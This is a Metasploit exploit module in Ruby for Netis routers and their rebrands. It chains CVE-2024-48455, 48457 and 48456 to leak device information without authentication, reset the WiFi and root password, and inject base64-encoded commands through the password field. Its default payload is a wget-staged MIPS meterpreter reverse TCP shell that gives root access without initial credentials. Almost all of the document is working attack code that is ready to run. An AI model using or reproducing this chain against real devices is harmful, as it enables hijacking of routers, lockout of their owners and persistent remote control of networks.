##
# Metasploit Module — saved locally via SuiteXPL MSF Bridge
# Source: https://github.com/rapid7/metasploit-framework
# CVE: CVE-2024-48455 (info disclosure), CVE-2024-48456 (RCE), CVE-2024-48457 (unauth pwd reset)
# Affects: Netis MW5360, NC21, NC63, NC65, NC66, NX10, NX30, NX31, NX62 + GLCtec/Stonet rebrand
# Bridge: embedxpl.core.bridges.exploit_bridge.run_via_msfconsole("netis_unauth_rce_cve_2024")
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Netis Router Exploit Chain (CVE-2024-48455/48456/48457)',
      'Description' => %q{
        1. CVE-2024-48455: Unauthenticated info disclosure via /cgi-bin/skk_get.cgi
        2. CVE-2024-48457: Unauthenticated password reset resets WiFi+root password
        3. CVE-2024-48456: Authenticated RCE via base64-encoded cmd in password param
        Chain yields full root shell without initial credentials.
      },
      'License' => MSF_LICENSE,
      'Author' => ['h00die-gr3y'],
      'References' => [
        ['CVE', '2024-48455'], ['CVE', '2024-48456'], ['CVE', '2024-48457'],
        ['URL', 'https://attackerkb.com/topics/L6qgmDIMa1/cve-2024-48455'],
        ['URL', 'https://attackerkb.com/topics/Urqj4ggP4j/cve-2024-48456'],
      ],
      'DisclosureDate' => '2024-12-27',
      'Privileged' => true,
      'Targets' => [['Linux Dropper', {'Platform' => ['linux'], 'Arch' => [ARCH_MIPSLE],
        'Type' => :linux_dropper, 'CmdStagerFlavor' => ['wget'],
        'DefaultOptions' => {'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp'}}]],
      'DefaultTarget' => 0,
      'DefaultOptions' => {'SSL' => false, 'RPORT' => 80, 'HttpClientTimeout' => 60},
      'Notes' => {'Stability' => [CRASH_SAFE], 'Reliability' => [REPEATABLE_SESSION], 'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES]}
    ))
    register_options([
      OptString.new('TARGETURI', [true, 'Netis router endpoint URL', '/']),
      OptInt.new('CMD_DELAY', [true, 'Delay between commands (seconds)', 30])
    ])
  end

  def set_router_password
    @password = Rex::Text.rand_text_alphanumeric(8..12)
    password_b64 = Base64.strict_encode64(@password)
    print_status('Resetting router password (CVE-2024-48457)...')
    send_request_cgi('method' => 'POST', 'uri' => normalize_uri(target_uri.path, '/cgi-bin/skk_set.cgi'),
      'vars_post' => {'wl_idx' => 0, 'wlanMode' => 0, 'encrypt' => 4, 'wpaPsk' => password_b64, 'wpaPskType' => 2,
        'wpaPskFormat' => 0, 'password' => password_b64, 'autoUpdate' => 0, 'firstSetup' => 1,
        'quick_set' => 'ap', 'app' => 'wan_set_shortcut', 'wl_link' => 0})
    print_status("Authenticating with new password #{@password}...")
    res = send_request_cgi('method' => 'POST', 'uri' => normalize_uri(target_uri.path, '/cgi-bin/login.cgi'),
      'keep_cookies' => true, 'vars_post' => {'password' => password_b64})
    res&.code == 200 && res.body.include?('SUCCESS')
  end

  def execute_command(cmd, _opts = {})
    @payload_name = cmd.split('+x')[1].strip if cmd.include?('chmod +x')
    unless cmd.include?('rm -f')
      payload = Base64.strict_encode64("`#{cmd}`")
      send_request_cgi('method' => 'POST', 'uri' => normalize_uri(target_uri.path, '/cgi-bin/skk_set.cgi'),
        'keep_cookies' => true,
        'vars_post' => {'password' => payload, 'new_pwd_confirm' => payload, 'passwd_set' => 'passwd_set',
          'mode_name' => 'skk_set', 'app' => 'passwd', 'wl_link' => 0})
    end
  end

  def on_new_session(_session)
    register_files_for_cleanup(@payload_name.to_s); super
  end

  def check
    print_status("Checking #{peer} for CVE-2024-48455...")
    res = send_request_cgi('method' => 'POST', 'uri' => normalize_uri(target_uri.path, '/cgi-bin/skk_get.cgi'),
      'vars_post' => {'mode_name' => 'skk_get', 'wl_link' => 0})
    return CheckCode::Unknown('No response') unless res&.code == 200 && res.body.include?('version')
    version = res.body.match(/(?:version\s*'|")\s*:\s*.?((\\|[^'|"])*)/)
    return CheckCode::Unknown('No version') unless version
    version_number = version[1].upcase.split('-V')[1]&.gsub(/[[:space:]]/, '')
    model_raw = version[1].upcase.split('-V')[0]
    model_number = model_raw.include?('(') ? model_raw[/\(([^)]+)/, 1] : model_raw.split('-').last
    model_number = model_number&.gsub(/[[:space:]]/, '')
    if version_number && model_number
      case model_number.split('V')[0]
      when 'NC63', 'NC65', 'NC66', 'NC21', 'NX10', 'NX30', 'NX31', 'NX62', 'MW5360', 'ALPHA-AC3', 'ALPHA-AC2', 'ALPHA-AC4'
        return CheckCode::Appears(version[1]) if Rex::Version.new(version_number) >= Rex::Version.new('1.0.0.0')
      end
      return CheckCode::Safe(version[1])
    end
    CheckCode::Unknown('Cannot parse version')
  end

  def exploit
    fail_with(Failure::NoAccess, 'Password reset failed') unless set_router_password
    store_valid_credential(user: 'root', private: @password)
    sleep(datastore['CMD_DELAY'])
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    execute_cmdstager(noconcat: true, delay: datastore['CMD_DELAY'])
  end
end
